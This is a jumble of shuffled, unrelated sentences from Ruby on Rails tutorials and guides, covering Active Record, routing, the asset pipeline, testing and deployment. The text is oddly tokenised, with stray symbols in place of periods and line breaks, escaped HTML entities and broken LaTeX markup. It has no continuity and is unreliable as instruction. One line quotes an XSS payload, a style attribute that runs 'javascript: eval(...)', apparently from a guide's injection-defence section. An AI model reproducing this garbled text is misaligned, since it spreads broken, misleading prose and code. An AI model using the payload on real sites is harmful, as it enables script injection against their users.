This happens because c and o ▖ customer are two different in-memory representations of the same data , and neither one is automatically refreshed from changes to the other ▖
Date ▖ new ( 2010 , 12 , 23 ) ▖ change ( year : 2011 , month : 11 )
After this point , all railtie and engine initializers are run .
In the case of the User model , the migration is created automatically by the model generation script ; it creates a \ kode { users } table with two columns , \ kode { name } and \ kode { email } , as shown in Listing ~ \ ref { code : users _ migration } .
Meanwhile , the \ kode { nav } , \ linebreak \ kode { navbar-nav } , and \ kode { navbar-right } classes on the \ kode { ul } tag have special meaning to Bootstrap and will be styled automatically when we include the Bootstrap CSS in Section ~ \ ref { sec : custom _ css } .
By default , methods defined in any helper file are automatically available in any view , but for convenience we &apos;ll put the \ kode { gravatar \ _ for } method in the file for helpers associated with the Users controller .
Get the root path ( Home page )
after _ bundle do
`ActiveRecord` is a Ruby module , whereas Active Record is an ORM ▖
{ a : 1 } ▖ assert _ valid _ keys ( : a ) # passes
This guide covers different ways to retrieve data from the database using Active Record .
# # # CSRF protection from remote ` &lt; script &gt; ` tags
&gt; &gt; 1 ▖ year ▖ from _ now
( We could have switched from \ kode { user } to \ kode { self } , but recall from Section ~ \ ref { sec : uniqueness _ validation } that \ kode { self } is optional inside the model ▖ )
Even better , we can configure Guard so that when , say , the \ kode { home ▖ html ▖ erb } file is modified , the \ kode { static \ _ pages \ _ spec ▖ rb } automatically runs .
# = &gt; { &quot; &quot; = &gt; nil , &quot; a &quot; = &gt; : a , &quot; 1 &quot; = &gt; 1 }
config ▖ assets ▖ css _ compressor = : yui
nothing to commit ( working directory clean )
In fact , inside the String class the use of \ kode { self ▖ } \ is optional on a method or attribute ( unless we &apos;re making an assignment ) , so
Since a word \ emph { is a } string , it &apos;s more natural to have our \ kode { Word } class \ emph { inherit } from \ kode { String } , as seen in Listing ~ \ ref { code : word _ class } .
To see the results of the templates defined in Listing ~ \ ref { code : account _ activation _ view _ text } and Listing ~ \ ref { code : account _ activation _ view _ html } , we can use \ emph { email previews } , which are special URLs exposed by Rails to let us see what our email messages look like .
We &apos;ll cover it momentarily ▖ )
Active Support for example uses this method in `Module # qualified _ const _ set` :
( We &apos;ll learn more about database migrations starting in Section ~ \ ref { sec : database _ migrations } ▖ )
This section will provide a step-by-step guide to creating a job and enqueuing it .
We start with a request issued from the browser---i ▖ e ▖ , the result of typing a URL in the address bar or clicking on a link ( Step ~ 1 in Figure ~ \ ref { fig : mvc _ detailed } ) .
Inside the \ kode { header } tag , we see a \ kode { div } tag :
id : &#91; 1,2,3 &#93; )
This means you &apos;re not required to provide localized views for all cases , but they will be preferred and used if available .
In case you &apos;re curious , you can view the environment variables used in Listing ~ \ ref { code : sendgrid _ config } as follows :
When you submit the form , you should see a ╼ familiar error :
The two services share many similarities : both sites allow for Git repository hosting and collaboration , as well as offering convenient ways to browse and search repositories .
# # # `belongs _ to` Association Reference
number _ to _ phone ( 1235551234 ) # = &gt; 123-555-1234
An example of flash persistence .
&#124; key &#124; key _ len &#124; ref &#124; rows &#124; Extra &#124;
&#124; &#124; 510 &#124; : not _ extended &#124;
The ` : counter _ cache` option can be used to make finding the number of belonging objects more efficient ▖
The unfortunate hybrid usage in the ``following &apos; &apos; route is forced by our choice to use the unambiguous ``followed users &apos; &apos; terminology along with the ``following &apos; &apos; usage from Twitter .
&quot; &quot; ▖ duplicable ?
Spork loads the environment \ emph { once } , and then maintains a pool of processes for running future tests .
Switch over to the target branch and apply your changes :
# config ▖ assets ▖ precompile + = % w ( search ▖ js )
The generated form HTML appears in Listing ~ \ ref { code : login _ form _ html } .
Notice the format ▖ js in the `respond _ to` block ; that allows the controller to ╼ respond to your Ajax request ▖
If you are sure about what you are doing and would like to have a more clear output , there &apos;s a way to override the flag :
# # # Get some Feedback
We &apos;ll see how to do this at the end of the section .
And you &apos;ll be able to switch between them without having to rewrite your jobs .
When this option is true , the asset pipeline will check if all the assets loaded ╼ in your application are included in the `config ▖ assets ▖ precompile` list ▖ ╼
With this route , Rails will match an incoming path of ` / photos / 12` to the `show` action of `PhotosController` .
number _ with _ precision ( 111 ▖ 2345 ) # = &gt; 111 ▖ 235
# Configure static asset server for tests with Cache-Control for performance
* `joins`
$ rails console
Because every micropost should have a user id , we &apos;ll add a test for a \ kode { user \ _ id } presence validation .
One of the most notable additions in recent versions of Rails is the asset pipeline , which significantly improves the production and management of static assets such as CSS , JavaScript , and images .
Its effect is to set the \ kode { @ current \ _ user } instance variable to the user corresponding to the remember token , but only if \ kode { @ current \ _ user } is undefined
has _ many : line _ items
Signup success creates a user in the database and redirects to the user show page , and displays a welcome message .
As \ href { http : / / en ▖ gravatar ▖ com / site / implement / hash / } { noted at the Gravatar home page } , Gravatar URLs are based on an \ href { http : / / en ▖ wikipedia ▖ org / wiki / MD5 } { MD5 hash } of the user &apos;s email address .
This is merely a convention , and in fact using snake case at the command line also works : the command
# ▖ ▖ .
d ▖ advance ( months : 1 , seconds : 1 )
A generalized \ kode { authenticated ? }
= &gt; # &lt; Blorgh : : Article id : 1 ▖ ▖ .
The valid formats consist of the \ href { https : / / en ▖ wikipedia ▖ org / wiki / Internet _ media _ type } { MIME types } accepted by the validation in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
@ user = user
As indicated in Figure ~ \ ref { fig : valid _ submission _ error } , this is because the default behavior for a Rails action is to render the corresponding view , and there isn &apos;t a view template corresponding to the \ kode { create } action .
Finally , Rails benefits from an unusually enthusiastic and diverse community .
Pipeline assets can be placed inside an application in one of three locations : ╼ `app / assets` , `lib / assets` or `vendor / assets` .
as shown in Listing ~ \ ref { code : test _ domain _ host } .
Please refer to the documentation of `Date ▖ _ parse` for further details .
We &apos;ll start by learning how to model relationships between users in Section ~ \ ref { sec : the _ relationship _ model } , and we &apos;ll build the corresponding web interface in Section ~ \ ref { sec : a _ web _ interface _ for _ following _ and _ followers } ( including an introduction to Ajax ) .
Checking for this requires the use of the ``not &apos; &apos; operator ( Section ~ \ ref { sec : objects _ and _ message _ passing } ) , written using an exclamation point ~ \ kode { ! } \ and usually read as ``bang &apos; &apos; .
= &gt; &quot; foobar &quot;
For example , you can &apos;t just interpolate ` @ review ▖ title` verbatim into an HTML page ▖
This means `Date ▖ today` may equal `Date ▖ yesterday` .
In this section , we &apos;ll implement a security model that requires users to be logged in and prevents them from updating any information other than their own .
@ user = User ▖ find ( params &#91; : id &#93; )
create _ table : account _ histories do &#124; t &#124;
master
It &apos;s important to keep in mind at all times that the application should ╼ * * always * * take precedence over its engines ▖
The feed item partial with added delete link .
I find this practice to be unnecessarily complicated , while also incurring an extra overhead if there are common setup tasks needed before each test .
Defaults to the same configured at `config ▖ logger` ▖
WARNING : Note that you must specify the extension of the image .
# &lt; hash &gt;
To help get you started , I can give two pieces of general advice .
Don &apos;t worry about how this works ; the details are of interest to developers of the Rails framework itself , and by design are not important for Rails application developers .
implies ( via the RSpec boolean convention ) that the user should have an \ kode { admin ? } \ boolean method .
This is a ╼ powerful technique that we call Ajax .
The method `truncate` returns a copy of its receiver truncated after a given `length` :
Let &apos;s see if the user with an \ kode { id } of ~ \ kode { 3 } still exists in the database :
Now that we &apos;ve updated the user by running \ kode { user ▖ save } , the magic columns differ , as promised in Section ~ \ ref { sec : creating _ user _ objects } :
This puts the CSS contained within the ╼ file ( if any ) at the precise location of the `require _ self` call .
If the other class contains the foreign key , then you should use `has _ one` instead .
Callbacks are not executed .
In addition to \ kode { length } ( seen in the first line above ) , arrays respond to a wealth of other methods :
def set _ author
has _ many : articles
3 ▖ ▖ 9 ) # = &gt; false
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
Unless you specify a version number to the \ kode { gem } command , Bundler will automatically install the latest requested version of the gem .
As with the line to include the application stylesheet , the code in Listing ~ \ ref { code : title _ helper } may look simple to the eyes of an experienced Rails developer , but it &apos;s \ emph { full } of important Ruby ideas : modules , method definition , optional method arguments , comments , local variable assignment , booleans , control flow , string concatenation , and return values .
NOTE : You only need to provide the &quot; host &quot; , this is the subdomain and root ╼ domain , you do not need to specify a protocol or &quot; scheme &quot; such as `http : / / ` or ╼ `https : / / ` ▖
Although the preceding code would work , it &apos;s not idiomatically correct Ruby ; instead , the proper way to write the assignment to \ kode { @ current \ _ user } is like this :
Note the question mark at the end of the \ kode { empty ? } \ method .
After running the \ kode { db : seed } Rake task , our application has 100 sample users .
Recall from Section ~ \ ref { sec : signup _ error _ messages } that we displayed signup errors using the User model error messages .
Inserting data into HTML templates needs extra care ▖
if boolean ?
# do something after perform
# # # # check _ box _ tag
Once the Heroku deploy has finished , try signing up for the sample application in production using an email address you control .
The documentation should be a model for best practices and canonical , modern Rails usage .
Additionally , the `--mountable` option tells the generator to mount the engine ╼ inside the dummy testing application located at `test / dummy` by adding the ╼ following to the dummy application &apos;s routes file at ╼ `test / dummy / config / routes ▖ rb` :
The default is
The collection of join models can be managed via the API ▖ For example , if you assign
This means that , in constructing the new session form , we have to give \ kode { form \ _ for } slightly more information ; in particular , whereas
Migrations change the state of the database using
Although we don &apos;t yet have a way to create microposts through the web---that comes in Section ~ \ ref { sec : creating _ microposts } ---this won &apos;t stop us from displaying them ( and testing that display ) .
SQL is case-insensitive , but it is conventional to write SQL keywords ( such as \ kode { DESC } ) in all-caps .
The options are ` : ruby` ( the default ) for a database-independent version that depends on migrations , or ` : sql` for a set of ( potentially database-dependent ) SQL statements .
Built-in rules can be extended in `config / initializers / inflections ▖ rb` ▖
name : &quot; David &quot; )
Below ╼ are a few examples of different data access methods provided by Active Record .
advance
as shown in Listing ~ \ ref { code : micropost _ create _ image _ upload } .
as shown in Listing ~ \ ref { code : users _ controller _ test _ login _ route } .
The console allows us to define methods the same way we did with the \ kode { home } action from Listing ~ \ ref { code : static _ pages _ controller } or the \ kode { full \ _ title } helper from Listing ~ \ ref { code : title _ helper } .
Sass and the asset pipeline allow us to eliminate duplication in our CSS while packaging up the results efficiently for production .
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `has _ and _ belongs _ to _ many` association reference ▖
An emphasis on HTTP verbs is typical of web frameworks ( including Rails ) influenced by the \ emph { REST architecture } , which we saw briefly in Chapter ~ \ ref { cha : a _ toy _ app } and will start learning about more in Chapter ~ \ ref { cha : sign _ up } .
$ git checkout -b testing _ branch
get &apos; / patients / : id &apos; , to : &apos; patients # show&apos;
To make this clearer , let &apos;s look at the HTML this tag produces
An Introduction to Ajax
For instance `ActionView : : Helpers : : FormHelper` defines :
client = Client ▖ last
The About page at \ href { http : / / localhost : 3000 / about } { / about } ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / about _ page _ styled-full ▖ png } { ( full size ) }
That &apos;s configurable via `Module ▖ attr _ internal _ naming _ format` though , you can pass any `sprintf`-like format string with a leading ` @ ` and a ` % s` somewhere , which is where the name will be placed ▖
That does not even put the entire Active Support in memory upfront indeed , some stuff is configured via `autoload` , so it is only loaded if used .
( We &apos;ll write integration tests to verify this behavior in Section ~ \ ref { sec : following _ tests } ▖ )
If you look at the HTML for the generated form by Ctrl-clicking and using the ``inspect element &apos; &apos; function of your browser , the page &apos;s source should look something like Listing ~ \ ref { code : signup _ form _ html } .
The rest of this chapter is dedicated to making this page flow actually work .
&lt; % = form _ for ( &#91; @ article , @ article ▖ comments ▖ build &#93; ) do &#124; f &#124; % &gt;
Code for an example user .
The `blog` directory has a number of auto-generated files and folders that make ╼ up the structure of a Rails application ▖
You wouldn &apos;t normally do this in a real application , but it &apos;s easier to understand the purpose of the layout file if we start by disabling it .
You can think of a polymorphic `belongs _ to` declaration as setting up an interface that any other model can use ▖
Rails supports default ordering via \ kode { default \ _ scope } .
A working status feed on the live Web .
as seen in Listing ~ \ ref { code : micropost _ user _ mismatch _ test } .
There are several reasons why you might want to precompile your assets locally ▖ ╼
* = require chrome
Section ~ \ ref { sec : user _ micropost _ associations } discusses the effects of this line in more depth ▖ )
Cache-Control : ╼ public , max-age = 2592000
d - 3 ▖ hours
The `clear` method is used when you intentionally want to clear all the messages in the `errors` collection ▖
This is easy using the named route \ kode { edit \ _ user \ _ path } from Table ~ \ ref { table : RESTful _ users } , together with the handy \ kode { current \ _ user } helper method defined in Listing ~ \ ref { code : current _ user _ working } :
TIP : Changes that are cosmetic in nature and do not add anything substantial to the stability , functionality , or testability of Rails will generally not be accepted ( read more about &#91; our rationales behind this decision &#93; ( https : / / github ▖ com / rails / rails / pull / 13771 # issuecomment-32746700 ) ) .
config ▖ assets ▖ css _ compressor = Transformer ▖ new
( If you set up the \ kode { co } alias in Section ~ \ ref { sec : version _ control } , you can use \ kode { git co -b modify-README } instead ▖ )
Although in many contexts we can effectively treat \ kode { following } as an array , Rails is smart about how it handles things under the hood .
If there are no errors on the specified attribute , an empty array ╼ is returned .
* `set _ clear _ dependencies _ hook` Provides a hook for `active _ record ▖ set _ dispatch _ hooks` to use , which will run before this initializer ▖
This partial will be responsible for rendering just the comment text , for now ▖ ╼
te } ╼ ╼ % subsection a _ working _ log _ in _ method ( end ) ╼ ╼ ╼ \ subsection { Current user } % ( fold ) ╼ \ label { sec : current _ user } ╼ ╼
&lt; % = image _ tag attachments &#91; &apos; image ▖ jpg &apos; &#93; ▖ url , alt : &apos; My Photo &apos; , class : &apos; photos &apos; % &gt;
as shown in Listing ~ \ ref { code : proto _ status _ feed } .
These concerns can be used in resources to avoid code duplication and share behavior across routes :
It defaults to true .
$ git pull --rebase
* Indent after private / protected .
Then fill \ kode { README ▖ md } with the contents of Listing ~ \ ref { code : new _ readme } .
# without try
You should ╼ instead rely on a data attribute ( e ▖ g ▖ `data : { confirm : &apos; Are you sure ? &apos; } ` ) .
At the beginning of this guide , you ╼ will be working solely within the engine itself , but in later sections you &apos;ll ╼ see how to hook it into an application .
Now we &apos;ll create a second user by revisiting the \ href { http : / / localhost : 3000 / users / new } { \ texttt { new } } page and submitting a second set of user information ; the resulting user \ href { http : / / localhost : 3000 / users } { \ texttt { index } } is shown in Figure ~ \ ref { fig : demo _ user _ index _ two _ rails _ 3 } .
# Ruby on Rails Tutorial : sample application
d ▖ next _ week ( : saturday ) # = &gt; Sat , 15 May 2010
The application code parallels the addition of the About page in Section ~ \ ref { sec : getting _ started _ with _ testing } : first we update the routes ( Listing ~ \ ref { code : contact _ route } ) , then we add a \ kode { contact } action to the Static Pages controller ( Listing ~ \ ref { code : contact _ action } ) , and finally we create a Contact view ( Listing ~ \ ref { code : contact _ view } ) .
( We &apos;ll start creating our own controllers in Chapter ~ \ ref { cha : a _ toy _ app } ▖ )
The special syntax ` : id` tells rails that this route expects an ` : id` ╼ parameter , which in our case will be the id of the article .
( Note that we have omitted the user \ kode { self } variable whenever possible ▖ )
# # # # Other Time Computations
NOTE : Defined in `active _ support / core _ ext / hash / deep _ merge ▖ rb` .
In Rails applications , \ texttt { POST } requests are typically used for \ emph { creating } things ( although HTTP also allows \ texttt { POST } to perform updates ) .
Prefix Verb URI Pattern Controller # Action
WARNING ▖ Take into account that `reverse _ merge ! ` may change the hash in the caller , which may or may not be a good idea .
- &#91; NGINX &#93; ( http : / / wiki ▖ nginx ▖ org / XSendfile )
By default such validations will run every time you call `valid ? ` ▖
resources : magazines do
As with ``Ctrl-C &apos; &apos; , the convention is to write ``Ctrl-D &apos; &apos; even though it &apos;s really ``Ctrl-d &apos; &apos; .
At this point , all the tests should be \ passing :
order _ number : &quot; A12345 &quot; )
It does not create a uniqueness constraint in the database , ╼ so it may happen that two different database connections create two records ╼ with the same value for a column that you intend to be unique ▖
In database terms , this association says that the other class will have a foreign key that refers to instances of this class .
For example , in this section we &apos;ll ensure that both the name and email fields are present before a user gets saved to the database .
This writes the path to the particular asset being referenced ▖ ╼ ╼
In the second case , we need to supply an additional \ kode { user } hash in order for the routes to work properly .
# set to &lt; tt &gt; : create &lt; / tt &gt; if &lt; tt &gt; new _ record ?
Here Rails infers that \ kode { @ users } is a list of \ kode { User } objects ; moreover , when called with a collection of users , Rails automatically iterates through them and renders each one with the \ kode { \ _ user ▖ html ▖ erb } partial .
appears as follows :
This application includes examples of all the major features of Rails , including models , views , controllers , templates , partials , filters , validations , callbacks , \ kode { has \ _ many } / \ kode { belongs \ _ to } and \ kode { has \ _ many : through } associations , security , testing , and deployment .
Note that Listing ~ \ ref { code : real _ account _ activation _ test } takes care to add an activation token to the fixture user , which would otherwise be blank .
Testing the feed HTML ▖
Then we &apos;ll write a simple test of an unsuccessful edit , as shown in Listing ~ \ ref { code : unsuccessful _ edit _ test } .
At present , newly registered users immediately have full access to their accounts ( Chapter ~ \ ref { cha : sign _ up } ) .
# = &gt; &lt; fieldset &gt; &lt; p &gt; &lt; input id = &quot; name &quot; name = &quot; name &quot; type = &quot; text &quot; / &gt; &lt; / p &gt; &lt; / fieldset &gt;
There are three main elements : an enhanced pass / fail reporter ( Section ~ \ ref { sec : minitest _ reporters } ) , a utility to filter the backtrace produced by failing tests ( Section ~ \ ref { sec : backtrace _ silencer } ) , and an automated test runner that detects file changes and automatically runs the corresponding tests ( Section ~ \ ref { sec : guard } ) .
create app / assets / stylesheets / static _ pages ▖ css ▖ scss
------------------------
For simple fixes , the easiest way to backport your changes is to &#91; extract a diff from your changes in master and apply them to the target branch &#93; ( http : / / ariejan ▖ net / 2009 / 10 / 26 / how-to-create-and-apply-a-patch-with-git ) .
The \ emph { Rails Tutorial } contains integrated tutorials not only for Rails , but also for the underlying Ruby language , the RSpec testing framework , \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTML } { HTML } , \ href { http : / / en ▖ wikipedia ▖ org / wiki / CSS } { CSS } , a small amount of \ href { http : / / en ▖ wikipedia ▖ org / wiki / JavaScript } { JavaScript } , and even a little \ href { http : / / en ▖ wikipedia ▖ org / wiki / SQL } { SQL } ▖ This means that , no matter where you currently are in your knowledge of web development , by the time you finish this tutorial you will be ready for more advanced Rails resources , as well as for the more systematic treatments of the other subjects mentioned .
The URL / users / 1 with routing but no page .
Since each user should have a feed , we are led naturally to a \ kode { feed } method in the User model , which will initially just select all the microposts belonging to the current user .
This means anything that compiles to ╼ JS / CSS is excluded , as well as raw JS / CSS files ; for example , ` ▖ coffee` and ╼ ` ▖ scss` files are * * not * * automatically included as they compile to JS / CSS .
$ rails new blog
&lt; % = field _ set _ tag do % &gt;
This optional section describes the testing setup used in the \ href { http : / / screencasts ▖ railstutorial ▖ org / } { Ruby on Rails Tutorial screencast series } .
Configuring Rails to use SendGrid in production .
in Listing ~ \ ref { code : about _ view } .
No real understanding
The form will be making a `POST` request to ` / articles / : article _ id / comments` , which ╼ will correspond with the `create` action in `Blorgh : : CommentsController` ▖
This provides remote backups and lets you catch any production errors as soon as possible .
# # # # HTML / JavaScript Injection
The correspondence between pages and URLs for the Users resource .
For example , when you aren &apos;t at all sure how to solve a given programming problem , it &apos;s often useful to skip the tests and write only application code , just to get a sense of what the solution will look like .
With these changes , Active Record will only load one copy of the customer object , preventing inconsistencies and making your application more efficient :
With the code in Listing ~ \ ref { code : follow _ unfollow _ following } , the tests should be \ passing :
We &apos;ll put the resulting \ kode { find } inside a \ kode { correct \ _ user } before filter , which checks that the current user actually has a micropost with the given id .
Since each user should have a feed , we are led naturally to a \ kode { feed } method in the User model .
The problem is that by default ( as of Rails ~ 3 ▖ 2 ▖ 3 ) \ emph { all } of the attributes for our Micropost model are accessible .
The syntax for this kind of object , called a \ emph { Proc } ( procedure ) or \ emph { lambda } , is the arrow ~ \ kode { - &gt; } .
A test for the new user page ▖
Using Action View with Rails
You can use a symbol to defer the choice of layout until a request is processed :
Moreover , persistent sessions are cumbersome to check by hand , so if we ever want to refactor the \ kode { current \ _ user } method ( as we will in Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } ) it &apos;s important to test it .
To send email in production , we &apos;ll use SendGrid , which is available as an add-on at Heroku for verified accounts .
# # # Mounting the Engine
validates : password , confirmation : true ,
It &apos;s possible to constrain the \ emph { display } size with CSS , but this doesn &apos;t change the image size .
Custom HTML for the Help page .
/ / = require bootstrap
There are several methods that you can use to check your ╼ models and validate that an attribute value is not empty , is unique and not ╼ already in the database , follows a specific format and many more .
This file will provide any ╼ common functionality for the controllers of the engine ▖
def update _ name
m ▖ reachable ?
# # # Route Globbing and Wildcard Segments
Client ▖ order ( : orders _ count , created _ at : : desc )
Active Record facilitates the creation and use of business ╼ objects whose data requires persistent storage to a database ▖
We first saw microposts in larval form in Chapter ~ \ ref { cha : a _ demo _ app } , and in this chapter we will make a full-strength version of the sketch from Section ~ \ ref { sec : microposts _ resource } by constructing the Micropost data model , associating it with the User model using the \ kode { has \ _ many } and \ kode { belongs \ _ to } methods , and then making the forms and partials needed to manipulate and display the results ( including , in Section ~ \ ref { sec : microposts _ with _ images } , uploaded images ) .
Active Record lets you use the names of the &#91; associations &#93; ( association _ basics ▖ html ) defined on the model as a shortcut for specifying `JOIN` clauses for those associations when using the `joins` method .
The data model for microposts .
The elements of logging in and out correspond to particular REST actions of the Sessions controller : the login form is handled by the \ kode { new } action ( covered in this section ) , actually logging in is handled by sending a \ texttt { POST } request to the \ kode { create } action ( Section ~ \ ref { sec : logging _ in } ) , and logging out is handled by sending a \ texttt { DELETE } request to the \ kode { destroy } action ( Section ~ \ ref { sec : logging _ out } ) .
The Rails way to display a temporary message is to use a special method called the \ emph { flash } , which we can treat like a hash .
Note that \ kode { git checkout -b modify-README } both creates a new branch and switches to it , as indicated by the asterisk in front of the \ kode { modify-README } branch .
In Chapter ~ \ ref { cha : filling _ in _ the _ layout } , we &apos;ll start putting it to good use in developing the sample application .
The Home page with status feed and incremented following count ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap-full ▖ png } { ( full size ) }
13 ▖ to _ s ( : rounded , precision : 5 ) # = &gt; 13 ▖ 00000
You should use this helper when you have two text fields that should receive ╼ exactly the same content ▖
This does not work in conjunction with the `as : : value` option .
&lt; % = javascript _ include _ tag &quot; application &quot; % &gt;
This prevents our code from activating users who have already been activated , which is important because we &apos;ll be logging in users upon confirmation , and we don &apos;t want to allow attackers who manage to obtain the activation link to log in as the user .
# updated _ at : datetime
@ articles = Article ▖ all
It &apos;s time to learn how to use Active Record to find user objects .
&#91; A powerful mechanism for controlling which sites certain content types can be loaded from &#93; ( http : / / w3c ▖ github ▖ io / webappsec / specs / content-security-policy / csp-specification ▖ dev ▖ html )
current _ user ▖ increment ! : visits
Micropost fixtures with user associations .
* `ENV &#91; &quot; RAILS _ ENV &quot; &#93; ` defines the Rails environment ( production , development , test , and so on ) that Rails will run under .
Instead you will need to use the associated ` * _ url` helper ▖
as seen in Listing ~ \ ref { code : application _ layout _ full _ title } .
This example assumes you are using Ruby ~ 1 ▖ 9 ▖ 3 or later .
to ensure that you have the latest version ▖ )
create _ table : assemblies do &#124; t &#124;
But it could be the case that `articles _ helper ▖ rb` raises a `NameError` due to an actual unknown constant ▖
# # # # `to _ sentence`
hello _ world
Putting these together , the test looks for an element of the following form :
in Listing ~ \ ref { code : hello _ action _ redux _ 2 } and
TIP : _ If you need to use a different controller namespace inside a `namespace` block you can specify an absolute controller path , e ▖ g : `get &apos; / foo &apos; = &gt; &apos; / foo # index &apos; ` ▖ _
If you choose to use PostgreSQL and are using JRuby , your `config / database ▖ yml` will look a little different ▖
Polymorphic associations were discussed in detail &lt; a href = &quot; # polymorphic-associations &quot; &gt; earlier in this guide &lt; / a &gt; .
This process was painful and error-prone .
# # # # `assert _ valid _ keys`
NOTE : There are `public` , `private` and `protected` methods in Ruby , ╼ but only `public` methods can be actions for controllers ▖ ╼
If you &apos;re running Linux , you might have to install a couple of other packages at this point :
We pass `id : false` to `create _ table` because that table does not represent a model ▖
To get an up-to-date list of the adapters ╼ see the API Documentation for &#91; ActiveJob : : QueueAdapters &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActiveJob / QueueAdapters ▖ html ) .
( All the examples in this book will use the \ kode { -m } flag ▖ )
will recognize incoming paths beginning with ` / photos` and route the requests to `PhotosController` , but use the value of the : as option to name the helpers .
Flash message keys are ╼ &#91; normalized to strings &#93; ( https : / / github ▖ com / rails / rails / commit / a668beffd64106a1e1fedb71cc25eaaa11baf0c1 ) ▖ They ╼ can still be accessed using either symbols or strings ▖
We &apos;ll fix the first issue in Section ~ \ ref { sec : signup _ error _ messages } and the second in Section ~ \ ref { sec : signup _ success } .
By default , associations look for objects only within the current module &apos;s scope ▖
Refactor the signin form to use \ kode { form \ _ tag } in place of \ kode { form \ _ for } .
inflect ▖ irregular &apos; tooth &apos; , &apos; teeth&apos;
The difficulty of a backport varies greatly from case to case , and sometimes it is simply not worth the effort .
in Listing ~ \ ref { code : activation _ token _ test } .
So , we see now that the line
Make sure the test suite still passes .
We often need to iterate over a large set of records , as when we send a newsletter to a large set of users , or when we export data .
In the next chapter , Chapter ~ \ ref { cha : sign _ up } , we &apos;ll make a working signup form to create new users , together with a page to display each user &apos;s information .
The difference ╼ is the line `belongs _ to : article` , which sets up an Active Record _ association _ ▖ ╼
```
At this point , the tests should pass :
To prepare the system for deployment to production , we run \ kode { bundle install } with a special flag to prevent the local installation of any production gems ( which in this case consists of ~ \ texttt { pg } and \ texttt { rails \ _ 12factor } ) :
as shown in Listing ~ \ ref { code : branch _ raise } .
See the &#91; Erubis documentation &#93; ( http : / / www ▖ kuwata-lab ▖ com / erubis / users-guide ▖ 06 ▖ html # topics-trimspaces ) for more information .
At this point , the full test suite should be \ passing :
# or
# # # Using `redirect _ to`
Prettier tests for the static pages .
Supported ╼ languages include Sass for CSS , CoffeeScript for JavaScript , and ERB for both by ╼ default .
Because it would be strange to force users to log in immediately after signing up , we &apos;ll log in new users automatically as part of the signup process .
belongs _ to : article
will also match the full title .
# # # Controlling Association Scope
&quot; hello &quot; ▖ from ( -2 ) # = &gt; &quot; lo &quot;
style = &quot; background : url ( &apos; javascript : eval ( document ▖ all ▖ mycode ▖ expr ) &apos; ) &quot; &gt;
record ▖ errors &#91; attribute &#93; &lt; &lt; ( options &#91; : message &#93; &#124; &#124; &quot; is not an email &quot; )
from Listing ~ \ ref { code : hello _ root _ route } to
beginning _ of _ year ( at _ beginning _ of _ year )
You can also use `url _ for` with a set of objects , and Rails will automatically determine which route you want :
in Listing ~ \ ref { code : micropost _ ordering _ test } .
&#124; POST &#124; / geocoder &#124; geocoders # create &#124; create the new geocoder &#124;
╼ $ bundle exec rake -T db
Configuring Rails Components
You can now create , show , and list articles ▖
# Turbolinks makes following links in your web application faster .
The second case , involving a scenario with two different browsers , is harder to simulate with an integration test , but it &apos;s easy to check in the User model test directly .
NOTE : Defined in `active _ support / core _ ext / array / wrap ▖ rb` .
NOTE ▖ Always specify an expected compiled filename that ends with ▖ js or ▖ css , ╼ even if you want to add Sass or CoffeeScript files to the precompile array .
I think of Chapter 1 as the ``weeding out phase &apos; &apos; in law school---if you can get your dev environment set up , the rest is easy to get through .
The resulting toy app will allow us to interact with it through its URLs , giving us insight into the structure of a Rails application , including a first example of the \ emph { REST architecture } favored by Rails .
Instead , it asks the database to count the microposts with the given \ kode { user \ _ id } .
Docrails is merged with master regularly , so you are effectively editing the Ruby on Rails documentation .
This also applies to your i18n ╼ translation files ▖
gem &apos; jquery-rails&apos;
The ` : shallow _ prefix` option adds the specified parameter to the named helpers :
( Here we have renamed the second argument \ kode { token } to emphasize that it &apos;s now generic ▖ )
Now we have to decide what to use as a remember token .
Based on this pattern , you may be able to guess how to run \ emph { all } the specs :
You can also pass raw SQL to the `lock` method for allowing different types of locks ▖
We will also make views to display both a user &apos;s followers and the users each user is following .
debug ( my _ hash )
We &apos;ll then complete user login in Section ~ \ ref { sec : logging _ in } by adding the necessary session-manipulation code .
The Static Pages controller test with a base title ▖
By using a simple HTML property instead of inserting the full JavaScript code ( as in previous versions of Rails ) , Rails follows the philosophy of \ href { http : / / railscasts ▖ com / episodes / 205-unobtrusive-javascript } { \ emph { unobtrusive JavaScript } } .
We encountered this idea briefly in the context of \ kode { reverse } in the \ kode { palindrome } method ( Section ~ \ ref { sec : a _ class _ of _ our _ own } ) , which also noted that \ kode { self } is \ emph { not } optional in an assignment , so
UserMailer ▖ weekly _ summary ( user ) ▖ deliver _ now
$ rake test
In this case , for example , the application would recognize paths such as :
To get the layout to work , we have to replace the default title with the Embedded Ruby from the examples above :
In this context , \ emph { hashed password } and \ emph { password digest } are synonyms ▖ )
In fact , you can even create a heterogeneous collection and render it this way , and Rails will choose the proper partial for each member of the collection :
has _ many : comments
Adding CSS for some universal styling applying to all pages .
Rails is smart enough to only execute the migrations that have not already been ╼ run against the current database , so in this case you will just see :
&quot; FalseClass &quot; = &gt; &quot; boolean &quot; ,
Scaffolding automatically creates code to model data and interact with it through the web .
# = &gt; # &lt; Person id : nil , name : nil &gt;
redirect _ to @ article
A test of login after signup ▖
&lt; % = render partial : @ products , spacer _ template : &quot; product _ ruler &quot; % &gt;
The view uses embedded Ruby to render the page as HTML .
The previous example generates `address _ street` rather than `street` .
&lt; option value = &quot; 3 &quot; &gt; Tobias &lt; / option &gt;
One nice effect of Cucumber &apos;s separation of concerns is that it operates at a higher level of abstraction .
Some numbers which are not singletons are not duplicable either :
However , this is just duplicating the functionality that would be provided to you by a class method .
All we need is to start with a user that has no remember digest ( which is true for the \ kode { @ user } variable defined in the \ kode { setup } method ) and then call \ kode { authenticated ? } , as shown in Listing ~ \ ref { code : test _ authenticated _ invalid _ token } .
# Use the existing token .
The effect of this is to reduce the ╼ number of requests for this asset from your server ; the asset has a good chance ╼ of being in the local browser cache or some intermediate cache .
&lt; % = link _ to &quot; Home &quot; , main _ app ▖ root _ path % &gt;
create app / jobs / guests _ cleanup _ job ▖ rb
Moving the \ kode { logged \ _ in \ _ user } method into the Application controller .
